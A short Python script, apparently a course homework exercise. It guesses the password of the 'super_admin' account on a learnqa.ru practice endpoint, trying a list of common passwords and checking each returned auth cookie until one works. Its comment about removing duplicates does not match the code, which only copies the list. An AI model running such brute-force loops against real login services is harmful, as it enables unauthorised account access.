import requests

login = "super_admin"
list_top_passwords = [
    '123456',
    '123456789',
    'qwerty',
    'password',
    '1234567',
    '12345678',
    '12345',
    'iloveyou',
    '111111',
    '123123',
    'abc123',
    'qwerty123',
    '1q2w3e4r',
    'admin',
    'qwertyuiop',
    '654321',
    '555555',
    'lovely',
    '7777777',
    'welcome',
    '888888',
    'princess',
    'dragon',
    'password1',
    '123qwe']

# удаляем дубли
passwords = []
for ltp in list_top_passwords:
        passwords.append(ltp)

print(f"searching among {len(passwords)} passwords...")
for password in passwords:
    payload = {
       "login": login,
       "password": password
    }
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}

    response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response2.text != "You are NOT authorized":
        print(f"login:{login}, password: {password}, response: {response2.text}")
        break
print("finish!")